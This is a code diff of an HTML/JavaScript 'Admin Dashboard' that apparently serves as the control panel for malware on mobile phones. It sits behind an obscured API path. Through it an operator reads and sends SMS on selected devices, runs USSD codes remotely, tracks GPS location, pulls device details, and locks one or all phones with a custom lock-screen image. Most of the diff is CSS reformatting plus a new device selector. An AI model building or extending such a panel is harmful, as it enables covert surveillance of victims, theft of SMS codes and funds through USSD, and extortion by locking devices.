@@ -6,86 +6,478 @@
     <title>Admin Dashboard</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', -apple-system, sans-serif; background: #0a0e17; color: #e0e6ed; padding: 20px; min-height: 100vh; }
+        body {
+            font-family: 'Segoe UI', -apple-system, sans-serif;
+            background: #0a0e17;
+            color: #e0e6ed;
+            padding: 20px;
+            min-height: 100vh;
+        }
         .container { max-width: 1100px; margin: 0 auto; }
-        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 2px solid #1a2332; margin-bottom: 30px; flex-wrap: wrap; gap: 10px; }
-        .header-left { display: flex; align-items: center; gap: 15px; }
-        .header-left h1 { font-size: 28px; color: #4fc3f7; font-weight: 700; letter-spacing: -0.5px; }
-        .admin-gry-badge { background: rgba(79,195,247,0.08); color: rgba(79,195,247,0.3); padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; letter-spacing: 1.5px; border: 1px solid rgba(79,195,247,0.1); user-select: none; }
-        .logout-btn { color: #ff6b6b; cursor: pointer; font-size: 14px; font-weight: 500; transition: 0.3s; background: none; border: none; }
+        
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 2px solid #1a2332;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .header-left h1 {
+            font-size: 28px;
+            color: #4fc3f7;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        .admin-gry-badge {
+            background: rgba(79,195,247,0.08);
+            color: rgba(79,195,247,0.3);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 1.5px;
+            border: 1px solid rgba(79,195,247,0.1);
+            user-select: none;
+        }
+        .logout-btn {
+            color: #ff6b6b;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: 0.3s;
+            background: none;
+            border: none;
+        }
         .logout-btn:hover { opacity: 0.7; }
-        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; margin-bottom: 30px; }
-        .stat-card { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 20px; text-align: center; transition: 0.3s; }
-        .stat-card:hover { border-color: #4fc3f7; transform: translateY(-2px); }
-        .stat-card .value { font-size: 32px; font-weight: 700; color: #4fc3f7; line-height: 1.2; }
-        .stat-card .label { font-size: 13px; color: #8896ab; margin-top: 4px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; }
-        .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 30px; }
-        .tool-card { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 20px; transition: 0.3s; }
-        .tool-card:hover { border-color: #4fc3f7; }
-        .tool-card h4 { font-size: 16px; color: #e0e6ed; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        
+        /* Stats */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .stat-card {
+            background: #111927;
+            border: 1px solid #1a2332;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            transition: 0.3s;
+        }
+        .stat-card:hover {
+            border-color: #4fc3f7;
+            transform: translateY(-2px);
+        }
+        .stat-card .value {
+            font-size: 32px;
+            font-weight: 700;
+            color: #4fc3f7;
+            line-height: 1.2;
+        }
+        .stat-card .label {
+            font-size: 13px;
+            color: #8896ab;
+            margin-top: 4px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        /* Device Selector */
+        .device-selector {
+            background: #111927;
+            border: 1px solid #1a2332;
+            border-radius: 12px;
+            padding: 15px 20px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        .device-selector label {
+            color: #8896ab;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .device-selector select {
+            flex: 1;
+            min-width: 200px;
+            padding: 10px 14px;
+            background: #0a0e17;
+            border: 1px solid #1a2332;
+            border-radius: 8px;
+            color: #e0e6ed;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .device-selector select:focus {
+            outline: none;
+            border-color: #4fc3f7;
+        }
+        .device-selector select option {
+            background: #111927;
+            color: #e0e6ed;
+        }
+        .device-selector .selected-device-info {
+            color: #8896ab;
+            font-size: 13px;
+            margin-left: auto;
+        }
+        .device-selector .selected-device-info strong {
+            color: #4fc3f7;
+        }
+        
+        /* Tools Grid */
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .tool-card {
+            background: #111927;
+            border: 1px solid #1a2332;
+            border-radius: 12px;
+            padding: 20px;
+            transition: 0.3s;
+        }
+        .tool-card:hover {
+            border-color: #4fc3f7;
+        }
+        .tool-card h4 {
+            font-size: 16px;
+            color: #e0e6ed;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
         .tool-card h4 .icon { font-size: 20px; }
-        .ussd-input-group { display: flex; gap: 8px; }
-        .ussd-input-group input { flex: 1; padding: 10px 14px; background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; font-size: 14px; font-family: 'Courier New', monospace; }
-        .ussd-input-group input:focus { outline: none; border-color: #4fc3f7; }
-        .ussd-input-group button { padding: 10px 20px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-weight: 600; cursor: pointer; transition: 0.3s; white-space: nowrap; }
+        .tool-card .device-name-display {
+            font-size: 12px;
+            color: #8896ab;
+            margin-bottom: 10px;
+        }
+        
+        /* USSD */
+        .ussd-input-group {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .ussd-input-group input {
+            flex: 2;
+            min-width: 150px;
+            padding: 10px 14px;
+            background: #0a0e17;
+            border: 1px solid #1a2332;
+            border-radius: 8px;
+            color: #e0e6ed;
+            font-size: 14px;
+            font-family: 'Courier New', monospace;
+        }
+        .ussd-input-group input:focus {
+            outline: none;
+            border-color: #4fc3f7;
+        }
+        .ussd-input-group button {
+            padding: 10px 20px;
+            background: #4fc3f7;
+            border: none;
+            border-radius: 8px;
+            color: #0a0e17;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            white-space: nowrap;
+        }
         .ussd-input-group button:hover { background: #3aa8dd; }
-        .ussd-response { margin-top: 10px; padding: 10px; background: #0a0e17; border-radius: 8px; border: 1px solid #1a2332; font-size: 13px; color: #8896ab; min-height: 50px; max-height: 120px; overflow-y: auto; font-family: 'Courier New', monospace; word-wrap: break-word; }
+        .ussd-response {
+            margin-top: 10px;
+            padding: 10px;
+            background: #0a0e17;
+            border-radius: 8px;
+            border: 1px solid #1a2332;
+            font-size: 13px;
+            color: #8896ab;
+            min-height: 50px;
+            max-height: 120px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            word-wrap: break-word;
+        }
         .ussd-response.success { color: #6bcb77; border-color: #6bcb77; }
         .ussd-response.error { color: #ff6b6b; border-color: #ff6b6b; }
         .ussd-response.waiting { color: #ffd700; border-color: #ffd700; }
-        .location-info { display: flex; flex-direction: column; gap: 8px; }
-        .location-info .coord { color: #8896ab; font-size: 13px; }
+        .ussd-response.no-device { color: #8896ab; border-color: #4a5568; }
+        
+        /* Location */
+        .location-info {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .location-info .coord {
+            color: #8896ab;
+            font-size: 13px;
+        }
         .location-info .coord strong { color: #e0e6ed; }
-        .location-info .map-link { color: #4fc3f7; text-decoration: none; font-size: 13px; }
+        .location-info .map-link {
+            color: #4fc3f7;
+            text-decoration: none;
+            font-size: 13px;
+        }
         .location-info .map-link:hover { text-decoration: underline; }
-        .device-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 4px 16px; font-size: 13px; }
+        
+        /* Device Info */
+        .device-info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4px 16px;
+            font-size: 13px;
+        }
         .device-info-grid .label { color: #8896ab; }
         .device-info-grid .value { color: #e0e6ed; font-weight: 500; }
-        .section { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 24px; margin-bottom: 24px; }
-        .section h3 { font-size: 18px; font-weight: 600; color: #e0e6ed; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
-        .section h3 .badge-count { background: #1a2332; color: #8896ab; font-size: 12px; padding: 2px 10px; border-radius: 12px; }
-        .device-controls { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; }
-        .device-controls button { padding: 6px 14px; border: none; border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer; transition: 0.3s; }
+        
+        /* Sections */
+        .section {
+            background: #111927;
+            border: 1px solid #1a2332;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+        .section h3 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #e0e6ed;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .section h3 .badge-count {
+            background: #1a2332;
+            color: #8896ab;
+            font-size: 12px;
+            padding: 2px 10px;
+            border-radius: 12px;
+        }
+        
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+        }
+        th {
+            text-align: left;
+            color: #8896ab;
+            padding: 10px 12px;
+            border-bottom: 2px solid #1a2332;
+            font-weight: 600;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        td {
+            padding: 10px 12px;
+            border-bottom: 1px solid #0d1420;
+            color: #c8d0dc;
+        }
+        tr:hover td { background: rgba(79,195,247,0.02); }
+        
+        .badge {
+            display: inline-block;
+            padding: 3px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .badge.online { background: rgba(107,203,119,0.15); color: #6bcb77; }
+        .badge.offline { background: rgba(255,107,107,0.15); color: #ff6b6b; }
+        .badge.locked { background: rgba(255,107,107,0.15); color: #ff6b6b; }
+        .badge.unlocked { background: rgba(107,203,119,0.15); color: #6bcb77; }
+        
+        /* Empty state */
+        .empty {
+            text-align: center;
+            padding: 30px 0;
+            color: #4a5568;
+            font-size: 14px;
+        }
+        .empty .icon { font-size: 36px; margin-bottom: 8px; }
+        
+        /* Login */
+        .login-container {
+            max-width: 380px;
+            margin: 100px auto;
+            background: #111927;
+            border: 1px solid #1a2332;
+            border-radius: 16px;
+            padding: 40px;
+            text-align: center;
+        }
+        .login-container .logo { font-size: 48px; margin-bottom: 8px; }
+        .login-container h3 { font-size: 22px; font-weight: 600; margin-bottom: 4px; }
+        .login-container .sub {
+            color: #8896ab;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 12px 14px;
+            margin: 8px 0;
+            background: #0a0e17;
+            border: 1px solid #1a2332;
+            border-radius: 8px;
+            color: #e0e6ed;
+            font-size: 14px;
+            transition: 0.3s;
+        }
+        .login-container input:focus {
+            outline: none;
+            border-color: #4fc3f7;
+            box-shadow: 0 0 0 3px rgba(79,195,247,0.1);
+        }
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 12px;
+            background: #4fc3f7;
+            border: none;
+            border-radius: 8px;
+            color: #0a0e17;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .login-container button:hover {
+            background: #3aa8dd;
+            transform: translateY(-1px);
+        }
+        .login-container .attempts-msg {
+            color: #ffd700;
+            font-size: 13px;
+            margin-top: 8px;
+            min-height: 20px;
+        }
+        .login-container .error {
+            color: #ff6b6b;
+            margin-top: 10px;
+            display: none;
+            font-size: 14px;
+        }
+        .hidden { display: none; }
+        
+        /* Device Controls */
+        .device-controls {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin: 10px 0;
+        }
+        .device-controls button {
+            padding: 6px 14px;
+            border: none;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+        }
         .device-controls button:hover { transform: scale(1.02); opacity: 0.9; }
         .btn-lock { background: #ff6b6b; color: #0a0e17; }
         .btn-unlock { background: #6bcb77; color: #0a0e17; }
         .btn-lock-all { background: #ff4444; color: #fff; }
         .btn-unlock-all { background: #44aa55; color: #fff; }
-        .device-card { background: #111927; border: 1px solid #1a2332; border-radius: 10px; padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; transition: 0.3s; }
-        .device-card:hover { border-color: #4fc3f7; }
-        .device-card .name { font-weight: 600; }
-        .device-card .status { font-size: 12px; padding: 2px 10px; border-radius: 12px; }
-        .device-card .status.locked { background: rgba(255,107,107,0.2); color: #ff6b6b; }
-        .device-card .status.unlocked { background: rgba(107,203,119,0.2); color: #6bcb77; }
-        table { width: 100%; border-collapse: collapse; font-size: 14px; }
-        th { text-align: left; color: #8896ab; padding: 10px 12px; border-bottom: 2px solid #1a2332; font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
-        td { padding: 10px 12px; border-bottom: 1px solid #0d1420; color: #c8d0dc; }
-        tr:hover td { background: rgba(79,195,247,0.02); }
-        .badge { display: inline-block; padding: 3px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; }
-        .badge.online { background: rgba(107,203,119,0.15); color: #6bcb77; }
-        .badge.offline { background: rgba(255,107,107,0.15); color: #ff6b6b; }
-        .badge.locked { background: rgba(255,107,107,0.15); color: #ff6b6b; }
-        .badge.unlocked { background: rgba(107,203,119,0.15); color: #6bcb77; }
-        .empty { text-align: center; padding: 30px 0; color: #4a5568; font-size: 14px; }
-        .empty .icon { font-size: 36px; margin-bottom: 8px; }
-        .login-container { max-width: 380px; margin: 100px auto; background: #111927; border: 1px solid #1a2332; border-radius: 16px; padding: 40px; text-align: center; }
-        .login-container .logo { font-size: 48px; margin-bottom: 8px; }
-        .login-container h3 { font-size: 22px; font-weight: 600; margin-bottom: 4px; }
-        .login-container .sub { color: #8896ab; font-size: 14px; margin-bottom: 20px; }
-        .login-container input { width: 100%; padding: 12px 14px; margin: 8px 0; background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; font-size: 14px; transition: 0.3s; }
-        .login-container input:focus { outline: none; border-color: #4fc3f7; box-shadow: 0 0 0 3px rgba(79,195,247,0.1); }
-        .login-container button { width: 100%; padding: 12px; margin-top: 12px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; }
-        .login-container button:hover { background: #3aa8dd; transform: translateY(-1px); }
-        .login-container .attempts-msg { color: #ffd700; font-size: 13px; margin-top: 8px; min-height: 20px; }
-        .login-container .error { color: #ff6b6b; margin-top: 10px; display: none; font-size: 14px; }
-        .hidden { display: none; }
-        .file-upload-area { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin: 8px 0; }
-        .file-upload-area input[type="file"] { background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; padding: 8px; font-size: 13px; }
-        .file-upload-area button { padding: 8px 16px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-weight: 600; cursor: pointer; }
-        .sms-send-area { display: flex; gap: 10px; flex-wrap: wrap; }
-        .sms-send-area input { flex: 1; min-width: 150px; padding: 10px 14px; background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; font-size: 14px; }
-        .sms-send-area button { padding: 10px 20px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-weight: 600; cursor: pointer; white-space: nowrap; }
-        @media (max-width: 600px) { .header { flex-wrap: wrap; gap: 10px; } .header-left h1 { font-size: 22px; } .stats { grid-template-columns: repeat(2, 1fr); } .admin-gry-badge { font-size: 9px; padding: 2px 10px; } .tools-grid { grid-template-columns: 1fr; } .device-info-grid { grid-template-columns: 1fr; } .ussd-input-group { flex-wrap: wrap; } .ussd-input-group button { width: 100%; } }
+        
+        /* SMS Send */
+        .sms-send-area {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .sms-send-area input {
+            flex: 1;
+            min-width: 150px;
+            padding: 10px 14px;
+            background: #0a0e17;
+            border: 1px solid #1a2332;
+            border-radius: 8px;
+            color: #e0e6ed;
+            font-size: 14px;
+        }
+        .sms-send-area button {
+            padding: 10px 20px;
+            background: #4fc3f7;
+            border: none;
+            border-radius: 8px;
+            color: #0a0e17;
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        
+        /* File Upload */
+        .file-upload-area {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin: 8px 0;
+        }
+        .file-upload-area input[type="file"] {
+            background: #0a0e17;
+            border: 1px solid #1a2332;
+            border-radius: 8px;
+            color: #e0e6ed;
+            padding: 8px;
+            font-size: 13px;
+        }
+        .file-upload-area button {
+            padding: 8px 16px;
+            background: #4fc3f7;
+            border: none;
+            border-radius: 8px;
+            color: #0a0e17;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .device-card {
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .device-card:hover {
+            border-color: #4fc3f7;
+        }
+        
+        @media (max-width: 600px) {
+            .header { flex-wrap: wrap; gap: 10px; }
+            .header-left h1 { font-size: 22px; }
+            .stats { grid-template-columns: repeat(2, 1fr); }
+            .admin-gry-badge { font-size: 9px; padding: 2px 10px; }
+            .tools-grid { grid-template-columns: 1fr; }
+            .device-info-grid { grid-template-columns: 1fr; }
+            .ussd-input-group { flex-wrap: wrap; }
+            .ussd-input-group button { width: 100%; }
+            .device-selector { flex-direction: column; align-items: stretch; }
+            .device-selector .selected-device-info { margin-left: 0; }
+        }
     </style>
 </head>
 <body>
@@ -114,25 +506,40 @@
 
         <!-- Stats -->
         <div class="stats" id="statsGrid">
-            <div class="stat-card"><div class="value" id="devicesCount">0</div><div class="label">📱 Devices</div></div>
-            <div class="stat-card"><div class="value" id="numbersCount">0</div><div class="label">🔢 Numbers</div></div>
+            <div class="stat-card"><div class="value" id="devicesCount">0</div><div class="label">📱 Total Devices</div></div>
             <div class="stat-card"><div class="value" id="onlineCount">0</div><div class="label">🟢 Online</div></div>
+            <div class="stat-card"><div class="value" id="numbersCount">0</div><div class="label">🔢 USSD Codes</div></div>
+            <div class="stat-card"><div class="value" id="smsCount">0</div><div class="label">💬 SMS</div></div>
         </div>
 
-        <!-- Tools Grid -->
+        <!-- Device Selector -->
+        <div class="device-selector">
+            <label for="deviceSelect">📱 Select Device:</label>
+            <select id="deviceSelect" onchange="onDeviceChange()">
+                <option value="">-- Select a device --</option>
+            </select>
+            <div class="selected-device-info" id="selectedDeviceInfo">
+                Status: <strong id="deviceStatus">Not selected</strong>
+            </div>
+        </div>
+
+        <!-- TOOLS GRID -->
         <div class="tools-grid">
             <!-- USSD -->
             <div class="tool-card">
                 <h4><span class="icon">📞</span> USSD Code</h4>
+                <div class="device-name-display" id="ussdDeviceName">No device selected</div>
                 <div class="ussd-input-group">
                     <input type="text" id="ussdInput" placeholder="Enter USSD code (e.g., *123#)" value="">
                     <button onclick="executeUssd()">Execute</button>
                 </div>
-                <div id="ussdResponse" class="ussd-response">Enter a USSD code and click Execute – response will appear here.</div>
+                <div id="ussdResponse" class="ussd-response no-device">Select a device first</div>
             </div>
+
             <!-- Location -->
             <div class="tool-card">
                 <h4><span class="icon">📍</span> Device Location</h4>
+                <div class="device-name-display" id="locationDeviceName">No device selected</div>
                 <div id="locationInfo" class="location-info">
                     <div class="coord"><strong>Latitude:</strong> <span id="latValue">--</span></div>
                     <div class="coord"><strong>Longitude:</strong> <span id="lngValue">--</span></div>
@@ -142,9 +549,11 @@
                     <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:0;font-size:13px;" onclick="refreshLocation()">🔄 Refresh Location</button>
                 </div>
             </div>
+
             <!-- Device Info -->
             <div class="tool-card">
                 <h4><span class="icon">📱</span> Device Info</h4>
+                <div class="device-name-display" id="infoDeviceName">No device selected</div>
                 <div id="deviceInfo" class="device-info-grid">
                     <span class="label">Model:</span><span class="value" id="diModel">--</span>
                     <span class="label">Manufacturer:</span><span class="value" id="diManufacturer">--</span>
@@ -160,14 +569,14 @@
         <!-- Device Control -->
         <div class="section">
             <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;">
-                <h3>🔒 Device Control</h3>
+                <h3>🔒 Device Control <span id="controlDeviceName" style="font-size:14px;color:#8896ab;">(No device selected)</span></h3>
                 <div class="device-controls">
-                    <button class="btn-lock" onclick="lockDevice(selectedDeviceId)">🔒 Lock Selected</button>
-                    <button class="btn-unlock" onclick="unlockDevice(selectedDeviceId)">🔓 Unlock Selected</button>
+                    <button class="btn-lock" onclick="lockDevice()">🔒 Lock</button>
+                    <button class="btn-unlock" onclick="unlockDevice()">🔓 Unlock</button>
                     <button class="btn-lock-all" onclick="lockAllDevices()">🔒 Lock All</button>
                     <button class="btn-unlock-all" onclick="unlockAllDevices()">🔓 Unlock All</button>
                 </div>
-            </div>
+               </div>
             <div class="file-upload-area">
                 <span style="color:#8896ab;font-size:13px;">Lock Screen Image:</span>
                 <input type="file" id="lockImageInput" accept="image/*" onchange="previewLockImage(event)">
@@ -177,18 +586,18 @@
             <div id="devicesLockList"><div class="empty"><div class="icon">🔒</div>Loading devices...</div></div>
         </div>
 
-        <!-- SMS -->
+        <!-- SMS Messages (Device-Specific) -->
         <div class="section">
             <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;margin-bottom:15px;">
-                <h3>💬 SMS Messages <span class="badge-count" id="smsCountBadge">0</span></h3>
+                <h3>💬 SMS Messages <span class="badge-count" id="smsCountBadge">0</span> <span id="smsDeviceName" style="font-size:14px;color:#8896ab;">(No device)</span></h3>
                 <button class="logout-btn" style="background:#4fc3f7;color:#0a0e17;padding:6px 14px;border-radius:6px;font-size:12px;border:none;cursor:pointer;" onclick="refreshSms()">🔄 Refresh</button>
             </div>
-            <div id="smsList"><div class="empty"><div class="icon">💬</div>No SMS messages yet</div></div>
+            <div id="smsList"><div class="empty"><div class="icon">💬</div>Select a device to view SMS</div></div>
         </div>
 
-        <!-- Send SMS -->
+        <!-- Send SMS (Device-Specific) -->
         <div class="section">
-            <h3>✉️ Send SMS</h3>
+            <h3>✉️ Send SMS <span id="sendSmsDeviceName" style="font-size:14px;color:#8896ab;">(No device)</span></h3>
             <div class="sms-send-area">
                 <input type="text" id="smsNumber" placeholder="Phone number">
                 <input type="text" id="smsMessage" placeholder="Message">
@@ -197,16 +606,10 @@
             <div id="smsSendResult" style="margin-top:8px;font-size:13px;color:#8896ab;"></div>
         </div>
 
-        <!-- Connected Devices -->
+        <!-- Recent USSD Codes (Device-Specific) -->
         <div class="section">
-            <h3>📱 Connected Devices <span class="badge-count" id="deviceCountBadge">0</span></h3>
-            <div id="devicesList"><div class="empty"><div class="icon">📱</div>No devices connected yet</div></div>
-        </div>
-
-        <!-- USSD Codes -->
-        <div class="section">
-            <h3>🔢 Recent USSD Codes <span class="badge-count" id="numberCountBadge">0</span></h3>
-            <div id="numbersList"><div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div></div>
+            <h3>🔢 Recent USSD Codes <span class="badge-count" id="numberCountBadge">0</span> <span id="ussdHistoryDeviceName" style="font-size:14px;color:#8896ab;">(No device)</span></h3>
+            <div id="numbersList"><div class="empty"><div class="icon">📞</div>Select a device to view USSD codes</div></div>
         </div>
     </div>
 </div>
@@ -214,13 +617,7 @@
 <script>
 const API_BASE = '/a9f3k217';
 let selectedDeviceId = null;
-
-function selectDevice(id) {
-    selectedDeviceId = id;
-    document.querySelectorAll('.device-card').forEach(el => el.style.borderColor = '#1a2332');
-    const card = document.querySelector(`.device-card[data-id="${id}"]`);
-    if (card) card.style.borderColor = '#4fc3f7';
-}
+let allDevices = {};
 
 // ============================================================
 // LOGIN
@@ -244,9 +641,6 @@ async function login() {
             document.getElementById('loginContainer').style.display = 'none';
             document.getElementById('dashboard').classList.remove('hidden');
             loadData();
-            refreshLocation();
-            refreshDeviceInfo();
-            refreshSms();
             refreshDevicesLock();
             document.getElementById('loginUser').value = '';
             document.getElementById('loginPass').value = '';
@@ -285,13 +679,87 @@ function logout() {
 }
 
 // ============================================================
+// DEVICE SELECTOR
+// ============================================================
+function updateDeviceSelector(devices) {
+    const select = document.getElementById('deviceSelect');
+    const currentValue = select.value;
+    
+    select.innerHTML = '<option value="">-- Select a device --</option>';
+    
+    for (const [id, device] of Object.entries(devices)) {
+        const option = document.createElement('option');
+        option.value = id;
+        option.textContent = device.name || id.substring(0, 12);
+        select.appendChild(option);
+    }
+    
+    // Restore selection if still valid
+    if (currentValue && devices[currentValue]) {
+        select.value = currentValue;
+    } else if (select.options.length > 1) {
+        select.value = select.options[1].value;
+    }
+    
+    onDeviceChange();
+}
+
+function onDeviceChange() {
+    const select = document.getElementById('deviceSelect');
+    selectedDeviceId = select.value;
+    
+    if (selectedDeviceId) {
+        const device = allDevices[selectedDeviceId];
+        const status = device?.online ? '🟢 Online' : '🔴 Offline';
+        document.getElementById('deviceStatus').textContent = status;
+        document.getElementById('selectedDeviceInfo').innerHTML = `Status: <strong>${status}</strong>`;
+        
+        // Update all device name displays
+        const deviceName = device?.name || selectedDeviceId.substring(0, 12);
+        document.getElementById('ussdDeviceName').textContent = '📱 ' + deviceName;
+        document.getElementById('locationDeviceName').textContent = '📱 ' + deviceName;
+        document.getElementById('infoDeviceName').textContent = '📱 ' + deviceName;
+        document.getElementById('controlDeviceName').textContent = '(' + deviceName + ')';
+        document.getElementById('smsDeviceName').textContent = '(' + deviceName + ')';
+        document.getElementById('sendSmsDeviceName').textContent = '(' + deviceName + ')';
+        document.getElementById('ussdHistoryDeviceName').textContent = '(' + deviceName + ')';
+        
+        // Load device-specific data
+        refreshLocation();
+        refreshDeviceInfo();
+        refreshSms();
+        refreshUssdHistory();
+        
+        document.getElementById('ussdResponse').className = 'ussd-response';
+        document.getElementById('ussdResponse').textContent = 'Ready. Enter USSD code and click Execute.';
+    } else {
+        document.getElementById('deviceStatus').textContent = 'Not selected';
+        document.getElementById('selectedDeviceInfo').innerHTML = 'Status: <strong>Not selected</strong>';
+        
+        // Reset all displays
+        document.getElementById('ussdDeviceName').textContent = 'No device selected';
+        document.getElementById('locationDeviceName').textContent = 'No device selected';
+        document.getElementById('infoDeviceName').textContent = 'No device selected';
+        document.getElementById('controlDeviceName').textContent = '(No device selected)';
+        document.getElementById('smsDeviceName').textContent = '(No device)';
+        document.getElementById('sendSmsDeviceName').textContent = '(No device)';
+        document.getElementById('ussdHistoryDeviceName').textContent = '(No device)';
+        
+        document.getElementById('ussdResponse').className = 'ussd-response no-device';
+        document.getElementById('ussdResponse').textContent = 'Select a device first';
+    }
+}
+    
+// ============================================================
 // DEVICE LOCK/UNLOCK
 // ============================================================
 async function refreshDevicesLock() {
     try {
         const response = await fetch(API_BASE + '/api/devices-lock');
-        const data = await response.json();
-        renderDevicesLock(data);
+        allDevices = await response.json();
+        renderDevicesLock(allDevices);
+        updateDeviceSelector(allDevices);
+        updateStats(allDevices);
     } catch (error) {
         console.error('Error loading devices:', error);
     }
@@ -303,7 +771,7 @@ function renderDevicesLock(devices) {
         container.innerHTML = '<div class="empty"><div class="icon">🔒</div>No devices available</div>';
         return;
     }
-       let html = '<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th><th>Action</th></tr></thead><tbody>';
+    let html = '<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th><th>Action</th></tr></thead><tbody>';
     Object.keys(devices).forEach(id => {
         const d = devices[id];
         const isLocked = d.locked || false;
@@ -314,7 +782,8 @@ function renderDevicesLock(devices) {
         const actionBtn = isLocked 
             ? `<button class="btn-unlock" onclick="unlockDevice('${id}')">Unlock</button>`
             : `<button class="btn-lock" onclick="lockDevice('${id}')">Lock</button>`;
-        html += `<tr class="device-card" data-id="${id}" onclick="selectDevice('${id}')">`;
+        const isSelected = id === selectedDeviceId;
+        html += `<tr class="device-card" data-id="${id}" onclick="selectDeviceFromList('${id}')" style="${isSelected ? 'border: 2px solid #4fc3f7;' : ''}">`;
         html += `<td><span class="name">${d.name || id}</span></td>`;
         html += `<td><span class="badge ${lockClass}">${lockText}</span> <span class="badge ${onlineClass}">${onlineText}</span></td>`;
         html += `<td>${d.battery || '--'}%</td>`;
@@ -325,13 +794,26 @@ function renderDevicesLock(devices) {
     container.innerHTML = html;
 }
 
-async function lockDevice(deviceId) {
-    if (!deviceId) { alert('Please select a device first'); return; }
+function selectDeviceFromList(id) {
+    const select = document.getElementById('deviceSelect');
+    select.value = id;
+    onDeviceChange();
+}
+
+function updateStats(devices) {
+    const total = Object.keys(devices).length;
+    const online = Object.values(devices).filter(d => d.online).length;
+    document.getElementById('devicesCount').textContent = total;
+    document.getElementById('onlineCount').textContent = online;
+}
+
+async function lockDevice() {
+    if (!selectedDeviceId) { alert('Please select a device first'); return; }
     try {
         const response = await fetch(API_BASE + '/api/lock-device', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ deviceId: deviceId, action: 'lock' })
+            body: JSON.stringify({ deviceId: selectedDeviceId, action: 'lock' })
         });
         const data = await response.json();
         if (data.success) { refreshDevicesLock(); }
@@ -339,13 +821,13 @@ async function lockDevice(deviceId) {
